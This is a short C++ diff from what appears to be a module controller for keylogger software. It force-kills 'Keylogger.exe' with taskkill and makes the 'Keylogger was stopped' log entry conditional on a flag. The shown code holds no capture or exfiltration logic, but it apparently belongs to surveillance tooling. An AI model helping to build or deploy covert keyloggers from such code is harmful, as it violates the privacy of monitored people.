@@ -21,10 +21,13 @@ void KillModules(control *C)
 	pthread_cancel(SS);
 	system("taskkill /F /T /IM Keylogger.exe");
 
-	ofstream out;
-	out.open(logkl, ios::app);
-	out << endl << "Keylogger was stopped in "; OutFullData(out); out << endl;
-	out.close();
+	if (!C->keylog)
+	{
+		ofstream out;
+		out.open(logkl, ios::app);
+		out << endl << "Keylogger was stopped in "; OutFullData(out); out << endl;
+		out.close();
+	}
 }
 
 void SingleModulesRun(control *C)
